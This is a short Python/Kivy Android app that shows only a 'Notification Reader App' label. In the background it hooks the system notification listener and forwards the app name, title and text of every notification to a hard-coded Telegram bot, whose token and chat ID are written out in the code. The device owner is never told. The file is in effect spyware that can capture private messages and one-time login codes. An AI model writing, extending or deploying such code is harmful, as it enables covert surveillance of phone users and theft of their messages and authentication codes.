import requests
from jnius import autoclass
from kivy.app import App
from kivy.uix.label import Label

# Replace with your bot token and chat ID
TELEGRAM_BOT_TOKEN = '7456059922:AAHPG-OTxBSLoslySTwnCdVC49V95wQYyAk'
TELEGRAM_CHAT_ID = '1059393984'

# Java Android classes
NotificationListenerService = autoclass('android.service.notification.NotificationListenerService')
Notification = autoclass('android.app.Notification')
Context = autoclass('android.content.Context')

class NotificationListener(NotificationListenerService):

    def onNotificationPosted(self, sbn):
        package_name = sbn.getPackageName()
        title = sbn.getNotification().extras.get("android.title")
        text = sbn.getNotification().extras.get("android.text")

        # Send notification data to Telegram bot
        self.send_to_telegram(package_name, title, text)

    def send_to_telegram(self, package, title, text):
        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        message = f"Notification from: {package}\nTitle: {title}\nText: {text}"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        try:
            response = requests.post(url, data=data)
            if response.status_code == 200:
                print("Notification sent to Telegram successfully")
            else:
                print(f"Failed to send notification: {response.status_code}")
        except Exception as e:
            print(f"Error sending notification to Telegram: {e}")

class MyApp(App):
    def build(self):
        return Label(text="Notification Reader App")

if __name__ == '__main__':
    MyApp().run()
